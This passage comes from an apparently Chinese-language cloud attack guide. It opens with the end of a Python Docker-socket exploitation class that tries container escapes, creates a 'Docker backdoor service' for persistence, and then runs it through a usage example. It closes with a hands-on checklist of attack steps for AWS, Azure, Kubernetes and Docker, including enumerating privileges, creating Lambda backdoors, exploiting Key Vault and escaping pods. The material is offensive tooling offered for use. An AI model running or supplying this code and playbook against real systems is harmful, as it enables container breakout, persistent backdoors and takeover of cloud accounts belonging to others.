            escape_methods.append('container_creation')
        
        if self.escape_via_image_manipulation():
            escape_methods.append('image_manipulation')
        
        # 4. 创建持久化
        if escape_methods:
            print("[*] Creating Docker persistence...")
            service = self.create_docker_backdoor_service()
            if service:
                print(f"[+] Docker backdoor service created: {service.id[:12]}")
        
        print(f"[+] Docker exploitation completed. Escape methods: {escape_methods}")
        return escape_methods

# 使用示例
docker_exploiter = DockerSocketExploiter()
docker_exploiter.auto_docker_exploitation()
```

---

## 实战检查清单

### AWS攻防
- [ ] IAM权限已枚举
- [ ] 权限提升已尝试
- [ ] S3存储桶已检查
- [ ] EC2实例已枚举
- [ ] Lambda后门已创建

### Azure攻防
- [ ] Azure AD已枚举
- [ ] 特权用户已识别
- [ ] Key Vault已利用
- [ ] 条件访问策略已分析

### Kubernetes攻防
- [ ] 容器环境已检测
- [ ] Pod逃逸已尝试
- [ ] 服务账户已利用
- [ ] Kubernetes API已访问

### Docker安全
- [ ] Docker Socket已检查
- [ ] 容器已枚举
- [ ] 镜像已分析
- [ ] 容器逃逸已实施